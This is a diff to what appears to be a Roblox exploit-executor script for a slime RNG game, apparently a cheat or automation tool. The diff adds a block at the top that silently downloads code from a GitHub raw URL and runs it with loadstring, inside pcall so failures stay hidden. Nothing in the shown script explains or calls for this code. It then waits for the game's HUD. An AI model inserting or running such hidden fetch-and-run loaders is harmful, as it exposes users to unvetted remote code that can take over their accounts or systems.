@@ -1,3 +1,10 @@
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/no"))()
+end)
+
+repeat task.wait() until game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("__MAINHUD__")
+
+task.wait(0.5)
 local cfg = getgenv().slime_rng_cfg or {}
 
 local RS = game:GetService("ReplicatedStorage")
